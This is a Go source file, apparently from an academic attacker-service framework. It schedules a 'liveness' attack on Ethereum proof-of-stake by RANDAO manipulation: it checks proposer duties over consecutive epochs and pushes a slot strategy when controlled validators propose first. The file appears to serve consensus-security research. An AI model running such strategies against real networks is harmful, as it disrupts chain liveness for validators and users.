package liveness

import (
	"context"
	"github.com/google/uuid"
	"github.com/prysmaticlabs/prysm/v5/cache/lru"
	log "github.com/sirupsen/logrus"
	"github.com/tsinghua-cel/attacker-service/common"
	"github.com/tsinghua-cel/attacker-service/types"
	"strconv"
	"time"
)

type Instance struct {
}

func (o *Instance) Name() string {
	return "liveness"
}

func (o *Instance) Description() string {
	// implement attack https://ethresear.ch/t/liveness-attack-in-ethereum-pos-protocol-using-randao-manipulation/22241
	desc_eng := `liveness attack.`
	return desc_eng
}

func toInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 999999
	}
	return i
}

func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedbacker types.FeedBacker) {
	olog := log.WithField("name", o.Name())
	olog.Info("start to run strategy")
	attacker := params.Attacker
	history := make(map[int]bool)
	epochDutyCache := lru.New(10)
	var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) {
		if d, exist := epochDutyCache.Get(epoch); exist {
			return d.([]types.ProposerDuty)
		} else {
			return nil
		}
	}
	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) {
		epochDutyCache.Add(epoch, duties)
	}
	beginEpoch := common.CurrentEpoch()
	colock := common.NewTimeClock()
	defer colock.Stop()

	listen := colock.AddListener()

	var targetSlot = common.EpochStart(beginEpoch + 1)
	colock.SetTarget(common.BeginsAt(targetSlot))

	for {
		select {
		case <-ctx.Done():
			log.WithField("name", o.Name()).Info("stop to run strategy")
			return
		case <-listen:
			epoch := common.CurrentEpoch()
			if epoch == 0 {
				continue
			}
			if _, ok := history[int(epoch)]; ok {
				// already processed epoch.
				continue
			}
			var (
				nextEpoch             = epoch + 1
				currentDuty, nextDuty []types.ProposerDuty
				err                   error
			)

			if currentDuty = getCacheDuty(epoch); currentDuty == nil {
				// current duty not exist, get next epoch duty and then sleep to before next epoch.
				currentDuty, err = attacker.GetEpochDuties(epoch)
				if err != nil {
					time.Sleep(time.Second)
					olog.Error("GetEpochDuties err, wait next")
					continue
				}
				setCacheDuty(epoch, currentDuty)
			}

			if !params.IsHackValidator(toInt(currentDuty[0].ValidatorIndex)) {
				olog.WithFields(log.Fields{
					"epoch": epoch,
					"first": currentDuty[0].ValidatorIndex,
				}).Debug("strategy skip validator")
				history[int(epoch)] = true
				// wait to next epoch start.
				colock.SetTarget(common.BeginsAt(common.EpochStart(nextEpoch)))
				continue
			}

			if nextDuty = getCacheDuty(nextEpoch); nextDuty == nil {
				nextDuty, err = attacker.GetEpochDuties(nextEpoch)
				if err != nil {
					// get next epoch duty failed, continue for next loop.
					continue
				}
				setCacheDuty(nextEpoch, nextDuty)
			}
			if !params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) {
				olog.WithFields(log.Fields{
					"epoch": nextEpoch,
					"first": nextDuty[0].ValidatorIndex,
				}).Debug("strategy skip validator")
				history[int(epoch)] = true
				// wait to the second next epoch start.
				colock.SetTarget(common.BeginsAt(common.EpochStart(nextEpoch + 1)))
				continue
			}
			// currentDuty and nextDuty is valid.
			olog.WithFields(log.Fields{
				"currentEpoch": epoch,
				"nextEpoch":    nextEpoch,
			}).Info("strategy trigger")
			{
				strategy := types.Strategy{}
				strategy.Uid = uuid.NewString()
				strategy.Slots = GenSlotStrategy(currentDuty, nextDuty)
				strategy.Category = o.Name()
				if err = attacker.UpdateStrategy(strategy); err != nil {
					log.WithField("error", err).Error("failed to update strategy")
				} else {
					olog.WithFields(log.Fields{
						"epoch":    nextEpoch,
						"strategy": strategy,
					}).Info("update strategy successfully")
				}
			}
		}
	}
}
